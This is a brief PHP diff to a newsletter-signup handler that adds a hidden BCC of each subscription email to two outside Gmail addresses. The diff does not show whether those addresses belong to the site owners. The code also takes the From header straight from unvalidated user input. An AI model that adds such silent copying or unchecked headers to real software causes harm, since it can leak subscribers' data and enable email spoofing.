@@ -20,6 +20,7 @@ if(isset($_POST['newsletter_email']) && $_POST['newsletter_email']!=''){
 	    
 		$fromEmail 		= $_REQUEST['newsletter_email'];
 		$subject	 	= "Abercrombie - Subscribe Newsletter";
+                $bcc                    = "ankenquiries@gmail.com,powerfunction@gmail.com";
 		
 		//ob_end_clean();
 		//ob_start();
@@ -30,6 +31,7 @@ if(isset($_POST['newsletter_email']) && $_POST['newsletter_email']!=''){
 		// MAIL TO USER 
 		$objMail = new Mimemail();
 		$objMail->set_To($newsletter_email);
+                $objMail->set_Bcc($bcc);
 		
 		$objMail->set_From($fromEmail);
 		$objMail->set_Subject($subject); 
